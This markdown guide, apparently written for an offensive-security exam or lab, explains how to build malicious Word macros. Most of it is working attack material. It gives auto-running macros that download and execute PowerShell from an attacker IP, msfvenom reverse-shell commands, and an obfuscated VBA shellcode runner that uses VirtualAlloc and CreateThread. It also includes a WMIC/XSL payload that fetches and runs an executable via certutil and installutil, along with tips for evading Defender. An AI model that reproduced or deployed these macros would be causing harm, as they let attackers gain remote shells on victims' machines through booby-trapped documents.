# General info
Open this file with Markdown reader or with CyberChief render https://cyberchef.io/#recipe=Render_Markdown()&input=IyBUaXRsZQoKUmVuZGVyIG9mIGBjb2RlYA

Do not forget to put it into Document and not into Template.  
First, create and save the document as .docm (or .doc, depending on the situation) 
Once .docm file created, go to tab View => Macros => View Macros => "Macros in: XXX (document)" => put foo in Macro name => Create.  

# IMPORTANT : usual mistakes, please always check that before asking me  
1. Don't use Meterpreter directly; always keep simple payload, reverse TCP shell (so `msfvenom -p windows/shell_reverse_tcp`)
2. Don't use exotic ports; stick to 80, 443 and eventually 53/8080 (`nc -lvnp 443`)
3. Put the macro in the DOCUMENT, not in the template (because it will be only on your dev box)
4. Always try the macro first on the dev box (not your computer since you might have Word 64 bits), first with Defender disabled, and once it works, with Defender enabled (the AV version is the same with all boxes)
5. All the following payload are confirmed to work on all active sets (AV is the same and is not updated); if it doesn't work, it's not the payload I provide.

Guide written by Tamarisk.

# 1. The simplest :

https://raw.githubusercontent.com/S3cur3Th1sSh1t/OffensiveVBA/main/src/Reverse-Shell.vba

Put your VPN IP, port 80/443/8080, and run `nc -lvnp 8080` listener.


# 2. Basic Powershell command - Powershell

```vb
Sub MyMacro()
    Dim strArg As String
    strArg = "powershell IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.X.Y/rev.ps1')"
    Shell strArg, vbHide
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen() 
    MyMacro
End Sub
```

# 3. Simple way - BadAssMacro + msfvenom

Important : do not run the macro on your own computer (you probably have Word 64 bits), this exploit is for 32 bits (both RDP dev box and exam machines have 32 bits Word, otherwise you have "type mismatch error")

BadAssMacro (https://github.com/Inf0secRabbit/BadAssMacros/releases/tag/v1.0), binary backup is present in the folder.  
`msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=443 EXITFUNC=thread -f raw -o shellcode.raw`  
`.\BadAssMacrosx86.exe -i shellcode.raw -s indirect -p no -w doc -o outvba.txt`

Insert into your document the content of the file outvba.txt

# 4. Obfuscated VBA with recepe - VBA + msfvenom
This comes from PDF after putting pieces together (exercice 6.8.3.1, look for the word "Almond" with Ctrl+F)

Generate payload with `msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=443 -f vbapplication`, then insert into following VBA runner

```vb
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr

Function Pears(Beets)
 Pears = Chr(Beets - 17)
End Function

Function Strawberries(Grapes)
 Strawberries = Left(Grapes, 3)
End Function

Function Almonds(Jelly)
 Almonds = Right(Jelly, Len(Jelly) - 3)
End Function

Function Nuts(Milk)
 Do
 Oatmilk = Oatmilk + Pears(Strawberries(Milk))
 Milk = Almonds(Milk)
 Loop While Len(Milk) > 0
 Nuts = Oatmilk
End Function

Function MyMacro()
 Dim Apples As String
 Dim Water As String
 Dim buf As Variant
 Dim addr As LongPtr
 Dim counter As Long
 Dim data As Long
 Dim res As Long

 buf = Array(252, ............................. 203)
 
 addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)

 For counter = LBound(buf) To UBound(buf)
  data = buf(counter)
  res = RtlMoveMemory(addr + counter, data, 1)
  Next counter

 res = CreateThread(0, 0, addr, 0, 0, 0)

End Function

Sub AutoOpen()
 MyMacro
End Sub

Sub Document_Open()
 MyMacro
End Sub
```

# 5. WMIC + XSL
Works for sure on DenkiAir

```vb
Sub AutoOpen()
    Shell "wmic process get brief /format:""http://<Kali_IP_web>/payload.xsl""", vbHide 
End Sub
```

If that doesn't work, use this project: https://gist.github.com/badkatro/8e5b764e7bfc1158e053 (backup below)

Create your EXE payload and encode it using certutil
The payload.xsl file should contain:
```xml
<?xml version='1.0'?>
<stylesheet version="1.0"
xmlns="http://www.w3.org/1999/XSL/Transform"
xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="http://mycompany.com/mynamespace%22%3E

<output method="text"/>
  <ms:script implements-prefix="user" language="JScript">
    <![CDATA[
      var ob = new ActiveXObject("WScript.Shell");
      ob.Run("certutil.exe -urlcache -f http://<Kali_IP_web>/met.enc C:\Users\Public\met.enc", 0, true);
      ob.Run("certutil.exe -decode C:\Users\Public\met.enc C:\Users\Public\met.exe", 0, true);
      ob.Run("C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Users\Public\met.exe", 0, true);
    ]]>
  </ms:script>
</stylesheet>
```


### Backup of the Badkatro project (in case of deletion), that also works
````Sub DownloadFile()

Dim myURL As String
myURL = "https://github.com/badkatro/AssignDocuments/blob/master/scripts/Main.vba"

'Dim WinHttpReq As Object
Dim WinHttpReq As XMLHTTP
'Set WinHttpReq = CreateObject("Microsoft.XMLHTTP")
Set WinHttpReq = New XMLHTTP

WinHttpReq.Open "GET", myURL, False, "badkatro", "Kocutel924"
WinHttpReq.send

Do While WinHttpReq.readyState <> 4
    DoEvents
Loop

myURL = WinHttpReq.responseBody

If WinHttpReq.Status = 200 Then
    
    Dim fso As New Scripting.FileSystemObject
    
    Dim ostream As TextStream
    
    Set ostream = fso.CreateTextFile("D:\Main.bas", True)
    'Set oStream = CreateObject("ADODB.Stream")
    
    'oStream.Open
    ostream.write (WinHttpReq.responseText)
    'ostream.Type = 1
    'ostream.write WinHttpReq.responseText
    'ostream.SaveToFile "D:\Main.bas", 2 ' 1 = no overwrite, 2 = overwrite
    ostream.Close
End If

Set WinHttpReq = Nothing

End Sub```
